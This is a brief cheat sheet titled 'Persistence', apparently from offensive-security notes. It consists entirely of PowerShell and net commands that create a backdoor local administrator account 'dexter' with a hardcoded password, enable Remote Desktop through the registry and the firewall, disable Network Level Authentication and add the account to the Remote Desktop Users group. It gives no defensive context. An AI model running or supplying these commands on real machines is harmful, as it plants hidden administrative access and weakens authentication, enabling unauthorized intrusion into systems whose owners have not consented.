# Persistence

```powershell
net user /add dexter @Password123
net localgroup administrators dexter /add

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

Start-Service -Name TermService

Set-Service -Name TermService -StartupType Automatic

# If your RDP client requires Network Level Authentication (NLA) but you want to disable it for ease of access, you can set this in the registry as well:
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\' -Name "UserAuthentication" -Value 0

# add user
Add-LocalGroupMember -Group "Remote Desktop Users" -Member dexter
net localgroup "Remote Desktop Users" dexter /add

# check
Get-LocalGroupMember -Group "Remote Desktop Users"
net localgroup "Remote Desktop Users"

# check service
Get-NetTCPConnection -LocalPort 5985
```